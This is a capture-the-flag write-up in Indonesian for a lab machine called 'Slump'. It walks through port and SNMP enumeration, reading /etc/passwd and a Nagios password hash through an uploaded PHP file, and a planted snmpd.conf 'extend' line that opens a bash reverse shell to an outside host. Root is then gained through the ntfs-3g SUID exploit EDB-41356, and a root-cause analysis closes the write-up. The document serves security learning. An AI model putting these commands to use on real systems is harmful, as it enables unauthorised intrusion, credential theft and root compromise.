Writeup CTF — Slump (10.1.2.116)
Difficulty: Hard
### Phase 1  Reconnaissance

**Port Scanning:**

```bash
rustscan -a 10.1.2.116 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
# Hasil: Port 22 (SSH), Port 80 (HTTP)

sudo nmap -sU 10.1.2.116 -sV
# Hasil: Port 161/UDP (SNMP public), 631/UDP (IPP), 5353/UDP (mDNS)
```
**Enumerasi SNMP:**
```bash
snmpwalk -v1 -c public 10.1.2.116 1.3.6.1.2.1.1
# Hostname: slump
# OS: Linux 4.16.5-custom x86_64
# Contact: admin <me@hacktrace.id>
```

**Enumerasi Web:**

```bash
feroxbuster -u http://10.1.2.116/ -w directory-list-2.3-medium.txt -x html,php,txt
# Ditemukan: /upload.php, /uploads/, /notes.txt, /nagios (401)
```

**Temuan kritis dari `notes.txt`:** Admin mengakui membuat sistem upload config SNMP via web dengan scheduler yang auto-apply setiap 2 menit

### Phase 2  Enumerasi Web Application

Upload `phpinfo.php` mengungkap konfigurasi PHP server:

**`disable_functions` memblokir:** `exec, passthru, shell_exec, system, proc_open, popen, curl_exec, curl_multi_exec` dan semua fungsi `pcntl_*`.

**Yang tidak diblokir:** `file_get_contents`, `file_put_contents`, `fopen`, `fread`, `fwrite`, dan modul Sockets.

Membaca file sensitif via `file_get_contents`:

```php
<?php echo file_get_contents('/etc/passwd'); ?>
<?php echo file_get_contents('/usr/local/nagios/etc/htpasswd.users'); ?>
# Hasil: nagiosadmin:$apr1$jvOzeYUo$DhnMVGtCgwYMOG0TNzkpn.
```

file notes.txt berisikan
```bash
OTES
=====
TO: myself

April 1, 2018:
Since I'm managing this monitoring system remotely, I need to create something that makes me easy to monitor all the system in the network.
Yesterday, I was thinking to use Nagios along with SNMP, but I will come back later with the idea.

April 3, 2018:
While I was driving this morning, I was thinking about remotely drop the SNMP config using a webserver. 
This is necessary if I want to change the config and fast apply. I need to create an upload function then.

April 4, 2018:
Nagios was installed, SNMP config was generated using the one comes with the installation, but I tweaked it a bit.
The uploader function was created. I successfully tested the upload function using my config, the SNMP server runs smoothly.

April 8, 2018:
I created a scheduler that will auto apply new config and remove all files on the upload folder, this to reminds me which files are working.

April 12, 2018:
Since this web will go DMZ, I need to secure the web server.

April 13, 2018:
Web server security applied. Hopefully no one can hack the server :)

April 16, 2018:
Time to monitor all the systems in my network using Nagios. Great work, salute to myself.


Note: don't forget to remove this file later.
```

upload file php pentest monkey sempat tersambung tetapi langsung di drop
```bash
sudo nc -lvnp 4444 
[sudo] password 
for greed: 
Listening on 0.0.0.0 4444 Connection received on 10.1.2.116 43914
```
### Phase 3  Initial Foothold via SNMP Extend RCE

Upload `snmpd.conf` berbahaya via `upload.php`:

```
rocommunity public
extend rshell /bin/bash -c 'bash -i >& /dev/tcp/10.18.200.142/4444 0>&1'
```

Tunggu 2 menit hingga scheduler berjalan, lalu trigger eksekusi via snmpwalk:

```bash
snmpwalk -v1 -c public 10.1.2.116 .1.3.6.1.4.1.8072.1.3.2
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."rshell" = STRING: /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."rshell" = STRING: -c 'bash -i >& /dev/tcp/10.18.200.142/4444 0>&1'
NET-SNMP-EXTEND-MIB::nsExtendRunType."rshell" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStatus."rshell" = INTEGER: active(1)
Timeout: No Response from 10.1.2.116
```

Shell diterima sebagai user `snmp`:

```bash
uid=112(snmp) gid=120(snmp) groups=120(snmp)
```

### Phase 4  Privilege Escalation via ntfs-3g (EDB-41356)

Linpeas menemukan SUID binary `ntfs-3g` versi lama yang rentan:

```bash
-rwsr-xr-x 1 root root 147K May 27 2015 /bin/ntfs-3g
ntfs-3g 2014.2.15AR.2 integrated FUSE 28
nproc
2
```

Download dan compile exploit EDB-41356 langsung di target karena kernel source dan gcc tersedia:

```bash
./compile.sh
make: Entering directory '/usr/src/linux-headers-4.16.5-custom'
  CC [M]  /tmp/41356/ntfs-3g-modprobe-unsafe/rootmod.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/41356/ntfs-3g-modprobe-unsafe/rootmod.mod.o
  LD [M]  /tmp/41356/ntfs-3g-modprobe-unsafe/rootmod.ko
make: Leaving directory '/usr/src/linux-headers-4.16.5-custom'
```

Karena exploit ini merupakan race condition, jalankan dalam loop:

```bash
for i in $(seq 1 5); do ./sploit; done

looks like we won the race
got ENFILE at 95232 total
Failed to open /proc/filesystems: Too many open files in system
yay, modprobe ran!
modprobe: ERROR: could not insert 'rootmod': Too many levels of symbolic links
we have root privs now...

id
uid=0(root) gid=0(root) groups=0(root)
```

### Phase 5 Root Cause Analysis

Setelah mendapatkan akses root, investigasi source code mengungkap penyebab fundamental vulnerability.

**`upload.php` — Tidak ada validasi input:**

```php
// Tidak ada filter ekstensi
$path = $path . basename($_FILES['uploaded_file']['name']);

// Tidak ada validasi MIME type
// File langsung dipindahkan tanpa pemeriksaan konten
move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path);
```

**`uploads/.htaccess` — Hanya memblokir PHP, bukan config file:**

```apache
<Files *.php>
    Order Deny,Allow
    Deny from all
    Allow from 127.0.0.1
</Files>
```

Akibatnya file `.conf` bebas diupload dan diproses tanpa hambatan.

**`/root/sync.sh` — Blind copy tanpa validasi sebagai root:**

```bash
# Tidak ada validasi konten file
cp -f $updated_file $snmp_conf

# snmpd direstart dengan config berbahaya
/etc/init.d/snmpd restart

# File dihapus setelah apply
rm -rf /var/www/html/uploads/*
```

Script ini berjalan sebagai root setiap 2 menit via crontab:

```
*/2 * * * * /bin/sh -x /root/sync.sh >> /root/sync.log
```

**Kombinasi ketiga kelemahan inilah yang memungkinkan full compromise** 
upload tanpa validasi + scheduler blind copy sebagai root + snmpd extend directive = reverse shell sebagai user `snmp`, dilanjutkan eskalasi ke root via ntfs-3g SUID exploit.